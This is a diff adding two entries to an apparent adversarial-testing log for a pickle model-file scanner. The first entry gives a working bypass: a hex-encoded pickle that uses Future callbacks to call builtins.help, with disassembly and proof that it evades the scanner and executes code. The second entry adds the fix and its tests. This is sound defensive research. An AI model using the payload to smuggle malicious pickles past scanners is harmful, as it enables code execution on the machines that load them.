@@ -20082,3 +20082,198 @@ format unchanged; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3890 passed, 1022 skipped, 21 warnings in 38.97s
 ```
+
+## Turn 291 - Bypass via `concurrent.futures.Future` stored callbacks
+
+Offensive turn after the Turn 290 regex defense. This moves to another finite
+source shape: stdlib objects that store callbacks and synchronously dispatch
+them from a later method call.
+
+Representative payload:
+
+```python
+future = concurrent.futures.Future()
+concurrent.futures.Future.add_done_callback(future, builtins.help)
+concurrent.futures.Future.set_result(future, "owned-token")
+```
+
+`Future.set_result()` marks the future complete and immediately invokes all
+callbacks previously registered with `add_done_callback()`. `builtins.help` then
+imports shadowable `pydoc`, giving runtime code execution even though the
+scanner never records the hidden `builtins.help(future)` call.
+
+Proof:
+
+```text
+payload_len 164
+payload_hex 80048c12636f6e63757272656e742e667574757265738c0646757475726593295294308c12636f6e63757272656e742e667574757265738c184675747572652e6164645f646f6e655f63616c6c6261636b932868008c086275696c74696e738c0468656c70937452308c12636f6e63757272656e742e667574757265738c114675747572652e7365745f726573756c74932868008c0b6f776e65642d746f6b656e74522e
+
+0: PROTO              4
+30: STACK_GLOBAL       # concurrent.futures.Future
+32: REDUCE             # Future()
+33: MEMOIZE            # memo[0] = future
+34: POP
+81: STACK_GLOBAL       # concurrent.futures.Future.add_done_callback
+83: BINGET             # future receiver
+101: STACK_GLOBAL      # builtins.help callback
+102: TUPLE             # (future, help)
+103: REDUCE            # future.add_done_callback(help)
+104: POP
+144: STACK_GLOBAL      # concurrent.futures.Future.set_result
+146: BINGET            # future receiver
+148: SHORT_BINUNICODE  # "owned-token"
+161: TUPLE             # (future, "owned-token")
+162: REDUCE            # future.set_result(...), invokes help(future)
+163: STOP
+```
+
+Scanner proof:
+
+```text
+scan clean findings 0 errors ()
+imports [
+  ('concurrent.futures', 'Future', 30, False),
+  ('concurrent.futures', 'Future.add_done_callback', 81, False),
+  ('builtins', 'help', 101, False),
+  ('concurrent.futures', 'Future.set_result', 144, False),
+]
+invocations [
+  ('concurrent.futures', 'Future', 0, None),
+  ('concurrent.futures', 'Future.add_done_callback', 2, None),
+  ('concurrent.futures', 'Future.set_result', 2, None),
+]
+```
+
+Runtime proof:
+
+```text
+runtime_rc 0
+runtime_type NoneType
+runtime_result None
+marker_exists True
+marker_text owned-by-future
+```
+
+Lazy boundary:
+
+```text
+future = concurrent.futures.Future()
+concurrent.futures.Future.add_done_callback(future, builtins.help)
+
+scan clean findings 0
+runtime_type NoneType
+runtime_result None
+marker_exists False
+```
+
+Why it bypasses:
+
+- `concurrent.futures.Future`, `Future.add_done_callback`, and
+  `Future.set_result` are clean import references; the policy blocks executor
+  submission/shutdown methods, not the `Future` state machine.
+- The Python call graph sees only direct imports/calls inside the Future
+  methods. It does not know that `add_done_callback()` stores a user callable
+  and `set_result()` later dispatches it.
+- The native stack model has stored callback receivers for a few sources
+  (`CallIterator`, `DefaultDict`, `RegexScanner`), but not for `Future`
+  callbacks.
+
+Likely source-level defense:
+
+- Add a compact `FutureCallbacks { callbacks }` stack value for
+  `concurrent.futures.Future()`.
+- Model `Future.add_done_callback(future, callback)` as a mutating method that
+  appends a tracked callback when the receiver is a tracked Future.
+- Model `Future.set_result(future, value)` and
+  `Future.set_exception(future, exc)` as dispatch methods that synthesize each
+  stored callback with one positional argument.
+- Also consider the inverse dispatch edge: CPython invokes callbacks
+  immediately when `add_done_callback()` is called on an already-finished
+  future, so the receiver state needs at least pending/done tracking.
+
+Performance note:
+
+- The representative payload is 164 bytes.
+- Warm scan timing over 1000 clean bypass scans was median `0.000078s`, p95
+  `0.000089s`, and max `0.000448s`.
+
+## Turn 292 - Defense for `Future` stored callback dispatch
+
+Defensive turn for the Turn 291 bypass. The fix models
+`concurrent.futures.Future` as a compact stored-callback receiver instead of
+blocking the package or only marking individual methods dangerous.
+
+Implementation:
+
+- Added a `FutureCallbacks` stack value that stores tracked callbacks, completion
+  state, and the memo index of the receiver.
+- When `Future()` is memoized, the stack model stamps the memo index onto both
+  the stack value and memo value so later method calls can mutate the same
+  tracked receiver.
+- `Future.add_done_callback(future, callback)` appends tracked callbacks while
+  the future is pending.
+- `Future.set_result(future, value)`, `Future.set_exception(future, exc)`, and
+  `Future.cancel(future)` mark the tracked receiver done and synthesize each
+  stored callback with one positional argument.
+- If `add_done_callback()` is called on an already-done tracked future, it
+  synthesizes the callback immediately, matching CPython behavior.
+- The model covers both `concurrent.futures` and `concurrent.futures._base`
+  import spellings.
+
+Regression coverage:
+
+- `Future(); add_done_callback(help); set_result("owned-token")` is malicious
+  and records `builtins.help(future)`.
+- `Future(); set_result("owned-token"); add_done_callback(help)` is malicious
+  because callbacks added to done futures execute immediately.
+- `Future(); add_done_callback(help)` remains clean and does not execute the
+  callback at runtime.
+
+Post-fix proof:
+
+```text
+future callback completion malicious 1 [
+  ('concurrent.futures', 'Future', 0, None),
+  ('concurrent.futures', 'Future.add_done_callback', 2, None),
+  ('concurrent.futures', 'Future.set_result', 2, None),
+  ('builtins', 'help', 1, None)
+]
+future pending only clean 0 [
+  ('concurrent.futures', 'Future', 0, None),
+  ('concurrent.futures', 'Future.add_done_callback', 2, None)
+]
+done future add callback malicious 1 [
+  ('concurrent.futures', 'Future', 0, None),
+  ('concurrent.futures', 'Future.set_result', 2, None),
+  ('concurrent.futures', 'Future.add_done_callback', 2, None),
+  ('builtins', 'help', 1, None)
+]
+```
+
+Performance note:
+
+- Warm scan timing over 1000 post-fix runs of the 164-byte Future callback
+  payload was median `0.000154s`, p95 `0.000161s`, and max `0.000240s`.
+- The memo mutation is limited to tracked `FutureCallbacks` stack values.
+
+Validation:
+
+```text
+cargo test --manifest-path packages/modelaudit-picklescan/Cargo.toml
+78 passed
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest <three Future callback tests> -q
+3 passed
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+178 passed
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+216 passed
+
+ruff format/check, mypy
+format unchanged; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3893 passed, 1022 skipped, 21 warnings in 44.43s
+```
